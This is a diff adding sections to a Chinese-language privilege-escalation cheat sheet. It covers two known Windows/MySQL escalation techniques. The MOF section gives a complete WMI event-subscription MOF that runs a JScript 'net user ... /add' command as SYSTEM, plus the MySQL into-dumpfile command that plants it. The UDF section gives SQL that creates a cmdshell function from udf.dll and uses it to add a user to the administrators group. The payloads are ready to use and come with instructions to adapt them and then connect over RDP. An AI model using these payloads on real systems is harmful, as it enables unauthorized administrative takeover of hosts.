@@ -94,9 +94,59 @@ https://link.zhihu.com/?target=https%3A//github.com/breenmachine/RottenPotatoNG
 
 ### MOF提权
 MOF文件是mysql数据库的扩展文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做”托管对象格式”，其作用是每隔五秒就会去监控进程创建和死亡，因为MOF文件每五秒就会执行，且是系统权限，所以如果我们有权限替换原有的mof文件，就能获得system权限
+```
+#pragma namespace("\\\\.\\root\\subscription")
+
+instance of __EventFilter as $EventFilter
+{
+EventNamespace = "Root\\Cimv2";
+Name  = "filtP2";
+Query = "Select * From __InstanceModificationEvent "
+"Where TargetInstance Isa \"Win32_LocalTime\" "
+"And TargetInstance.Second = 5";
+QueryLanguage = "WQL";
+};
+
+instance of ActiveScriptEventConsumer as $Consumer
+{
+Name = "consPCSV2";
+ScriptingEngine = "JScript";
+ScriptText =
+"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user waitalone waitalone.cn /add\")";
+};
+
+instance of __FilterToConsumerBinding
+{
+Consumer   = $Consumer;
+Filter = $EventFilter;
+};
+```
+
+其中的第18行的命令，上传前请自己更改。
+
+2、执行load_file及into dumpfile把文件导出到正确的位置即可。
+
+```
+select load file('c:/wmpub/nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mov'
+```
+
+执行成功后，即可添加一个普通用户，然后你可以更改命令，再上传导出执行把用户提升到管理员权限，然后3389连接之就ok了。
+
 
 ### UDF提权
 UDF,user defined funcion,即用户自定义函数，用户可以通过自己增加函数对mysql功能进行扩充，文件后缀为.dll
+要求: 1.目标系统是Windows(Win2000,XP,Win2003)； 2.拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数 3.有root账号密码 导出udf: MYSQL 5.1以上版本，必须要把udf.dll文件放到MYSQL安装目录下的lib\plugin文件夹下才能创建自定义函数 可以再mysql里输入 `select @@basedir` `show variables like ‘%plugins%’` 寻找mysql安装路径 提权:
 
+使用SQL语句创建功能函数。语法：Create Function 函数名（函数名只能为下面列表中的其中之一）returns string soname ‘导出的DLL路径’；
+
+```
+create function cmdshell returns string soname ‘udf.dll’
+select cmdshell(‘net user arsch arsch /add’);
+select cmdshell(‘net localgroup administrators arsch /add’);
+
+drop function cmdshell;
+```
+
+该目录默认是不存在的，这就需要我们使用webshell找到MYSQL的安装目录，并在安装目录下创建lib\plugin文件夹，然后将udf.dll文件导出到该目录即可。
 
 ## 其他
